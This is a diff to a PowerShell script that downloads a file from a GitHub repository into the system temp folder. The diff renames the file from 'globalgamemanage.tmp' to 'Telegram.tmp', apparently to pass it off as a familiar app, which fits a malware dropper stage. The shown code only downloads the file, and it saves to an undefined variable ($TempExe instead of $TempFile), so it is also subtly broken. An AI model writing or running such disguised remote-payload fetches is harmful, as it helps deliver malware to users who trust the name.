@@ -1,7 +1,7 @@
 $ErrorActionPreference = "Stop"
 
-$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.tmp"
-$TempFile = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"
+$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/Telegram.tmp"
+$TempFile = Join-Path ([IO.Path]::GetTempPath()) "Telegram.tmp"
 
 # Скачиваем файл
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
